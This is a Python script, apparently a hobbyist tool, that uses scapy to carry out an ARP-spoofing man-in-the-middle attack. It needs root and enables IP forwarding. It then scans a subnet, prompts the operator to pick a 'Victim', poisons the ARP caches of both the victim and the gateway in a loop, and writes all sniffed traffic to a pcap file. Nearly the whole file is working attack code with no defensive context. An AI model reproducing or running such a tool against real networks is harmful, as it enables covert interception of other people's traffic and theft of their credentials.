#!/user/bin python3

import scapy.all as scapy
import subprocess 
import sys
import time
import os
from ipaddress import IPv4Network
import threading






cwd = os.getcwd()  # to get the current working directory


#to check sudo, needed to enable ip forwarding

def check_sudo():
    if not 'SUDO_UID' in os.environ.keys():
        print("This Program will only work in Sudo mode")
        exit()



#now we will start scanning arp basically embedded the scanner into the engine
def arp_scan(ip_range):
    arp_responses = list()

    answered_lst = scapy.arping(ip_range,verbose=0)[0]
    for res in answered_lst:
        arp_responses.append({"ip" : res[1].psrc, "mac" : res[1].hwsrc})
    return arp_responses
    

# fetch the gateway ip

def is_gateway(gateway_ip):

    result = subprocess.run(["route", "-n"], capture_output=True).stdout.decode().split("\n")

    for row in result:

        if gateway_ip in row:
            return True
        

    return False



#now we will fetch the names of interfaces available

def get_interface():

    os.chdir("/sys/class/net")

    interface_names = os.listdir()

    return interface_names



# match the iface
def match_iface(row):
    interface_names = get_interface()

    for iface in interface_names:
        if iface in interface_names:
            return iface
        

#Now we will check and get gateway info
def gateway_info(network_info):
    result =  subprocess.run(["route", "-n"], capture_output=True).stdout.decode().split("\n")

    gateways = []

    for iface in network_info:
        for row in result:
            if iface["ip"] in row:
                iface_name = match_iface(row)
                gateways.append({"iface" : iface_name, "ip" : iface["ip"],  "mac" : iface["mac"] })


    return gateways


# provides the result of scanning the clients or hosts online
def clients(arp_res , gateway_res):

    client_list = []
    for gateway in gateway_res:
        for item in arp_res:
            if gateway["ip"] != item["ip"]:
                client_list.append(item)


    return client_list

# now we will enable ip forwarding to forward data packets after capturing

def ip_forwarding():
    subprocess.run(["sysctl", "-w","net.ipv4.ip_forward=1"])

    subprocess.run(["sysctl", "-p","/etc/sysctl.conf"])


#now all things are set up and we will do arp spoofing

def arp_spoof(target_ip, target_mac, spoof_ip):
    pkt = scapy.ARP(op=2,pdst=target_ip, hwdst=target_mac,psrc=spoof_ip)
    scapy.send(pkt, verbose=False)


#transefer spoof packets
def send_packets():
    while True:

        arp_spoof(gateway_info["ip"], gateway_info["mac"], node_to_spoof["ip"])
        arp_spoof(node_to_spoof["ip"], node_to_spoof["mac"], gateway_info["ip"])

        time.sleep(3)

#a callback fx to sniff packets
def sniffer(interface):
    packets = scapy.sniff(iface = interface, store = False, prn = proc_sniff)

#process the sniffed pckts
def proc_sniff(pkt):
    print("Writing to pcap file. Press Ctrl + C to exit")

    scapy.wrpcap("requests.pcap", pkt, append=True)   #here give custom filename




def print_arp(arp_res):
    print(r"          __________________     _   _______  ____   ____   __ _/")
    print(r"         _/ __ \_  __ \_  __ \/  /_\  \_  __ \/ ___\ /  _ \ / __ | ")
    print(r"         \  ___/|  | \/|  | \/\  \_/   \  | \/ /_/  >  <_> ) /_/ | ")
    print(r"          \___  >__|   |__|    \_____  /__|  \___  / \____/\____ | ")
    print(r"             \/                     \/     /_____/             \/ ")

    for id, res in enumerate(arp_res):
        print("{}\t\t{}\t\t{}". format(id,res['ip'], res['mac']))

    while True:
        try:

            choice = int(input("Select THe ID of the Victim "))

            if arp_res[choice]:
                return choice
        except:
            print("Enter a Valid Option")


def get_cmd_args():

    ip_range = None 
    if len(sys.argv) - 1 > 0  and sys.argv[1] != "ip_range":
        print("-ip_ramge flag not specified")
        return ip_range
    
    elif len(sys.argv) - 1 > 0  and sys.argv[1] == "-ip_range":
        try:
            print(f"{IPv4Network(sys.argv[2])}")

            ip_range = sys.argv[2]
            print("Valid Ip")

        except:
            print("Sahi Ip Dalo Bhai")

    return ip_range


check_sudo()

ip_range = get_cmd_args()

if ip_range == None:
    print("No valid IP range  | Exiting")
    exit()

ip_forwarding()

arp_res = arp_scan(ip_range)

if len(arp_res) == 0:
    print("No Connection, Exiting. MAke sure devices are On ")
    exit()


gateways = gateway_info(arp_res)

gateway_info = gateways[0]

client_info = clients(arp_res, gateways)

if len(client_info) ==  0:
    print("No clients Found when sending arp messages")
    exit()


choice = print_arp(client_info)

node_to_spoof = client_info[choice]


t1 = threading.Thread(target=send_packets, daemon=True)
t1.start()

os.chdir(cwd)

sniffer(gateway_info["iface"])